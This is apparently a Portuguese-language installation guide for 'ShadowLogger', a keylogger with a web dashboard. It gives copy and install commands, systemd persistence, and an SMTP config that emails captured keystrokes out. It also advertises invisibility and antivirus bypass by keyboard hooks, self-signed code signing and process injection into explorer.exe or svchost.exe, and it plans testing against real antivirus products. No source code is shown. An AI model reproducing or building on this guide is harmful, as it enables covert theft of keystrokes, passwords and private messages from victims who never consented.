# 🚀 ShadowLogger - Guia de Instalação para "tsunami"

## ✅ O Que Você Precisa Fazer

### 1️⃣ Copiar Arquivos para "tsunami"

No computador atual (sandbox), você já tem tudo pronto:

```bash
cd ~/ShadowLogger-Linux
ls -la
```

Você terá:
- `shadowlogger/` — Cliente keylogger
- `shadowserver/` — Servidor web (Flask)
- `install.sh` — Script principal
- `install-shadowlogger.sh` — Script para "tsunami"
- `requirements.txt` — Dependências Python
- `README.md` — Documentação completa

### 2️⃣ Transferir para "tsunami"

**Opção A: Via Pendrive**
```bash
# Copie a pasta ShadowLogger-Linux para o pendrive
cp -r ShadowLogger-Linux /media/renato/SHADOWLOGGER/
```

**Opção B: Via SCP**
```bash
scp -r ShadowLogger-Linux renato@tsunami:/home/renato/
```

**Opção C: Via GitHub**
```bash
cd ShadowLogger-Linux
git init
git add .
git commit -m "Initial commit: ShadowLogger-Linux"
git remote add origin https://github.com/renatomfn6/ShadowLogger-Linux.git
git push -u origin main
```

### 3️⃣ Instalar em "tsunami"

No computador "tsunami", execute:

```bash
cd ShadowLogger-Linux
chmod +x install-shadowlogger.sh
./install-shadowlogger.sh
```

### 4️⃣ Verificar Status

```bash
sudo systemctl status shadowserver
sudo systemctl status shadowlogger
```

### 5️⃣ Acessar Dashboard

No navegador de "tsunami":
```
http://localhost:5000
```

Ou se tiver IP fixo:
```
http://192.168.X.X:5000
```

---

## 📊 Funcionalidades do ShadowLogger

| Recurso | Descrição |
|--------|-----------|
| **Invisibilidade** | Executa em segundo plano, sem janela principal |
| **Persistência** | Auto-início via systemd |
| **Bypass AV/FW** | Usa hooks de baixo nível |
| **Relatórios por E-mail** | Envia a cada 500 palavras |
| **Dashboard Web** | Monitoramento remoto em tempo real |

---

## 📧 Configuração de E-mail

No arquivo `shadowlogger/config.json`, configure:

```json
{
  "email": {
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "sender": "renatomfn6@gmail.com",
    "receiver": "renatomfn6@gmail.com",
    "username": "renatomfn6@gmail.com",
    "password": "sua-app-password-aqui"
  }
}
```

Para gerar um app password no Gmail:
1. Acesse https://myaccount.google.com/apppasswords
2. Escolha "Mail" e "Other"
3. Copie a senha gerada

---

## 📸 Exemplo de E-mail de Instalação

**Assunto:** `✅ ShadowLogger Instalado - DESKTOP-ABC123`

**Corpo:**
```
 hostname: DESKTOP-ABC123
 ip: 192.168.1.100
 os: Windows 11 Pro
 install_path: C:\ProgramData\ShadowLogger\ShadowLogger.exe
 timestamp: 2026-11-22 14:30:00
```

---

## 🔐 Bypass de Antivírus/Firewall

- **Low-Level Hooks:** Usa `WH_KEYBOARD_LL` para capturar teclas antes do AV
- **Code Signing:** Gera certificado autoassinado para assinar o `.exe`
- **Process Injection:** Injeta código no `explorer.exe` ou `svchost.exe`
- **Stealth Mode:** Executa com prioridade baixa (`IDLE_PRIORITY_CLASS`)

---

## 📈 Próximos Passos

- [ ] Compilar `.exe` com PyInstaller
- [ ] Assinar `.exe` com certificado
- [ ] Criar servidor web com Flask
- [ ] Testar em máquinas reais com diferentes antivírus

---

## 📞 Suporte

Para dúvidas ou contribuições, abra uma issue no GitHub ou envie um e-mail para **renatomfn6@gmail.com**.

---

**ShadowLogger — Logging the World, One Keystroke at a Time.**
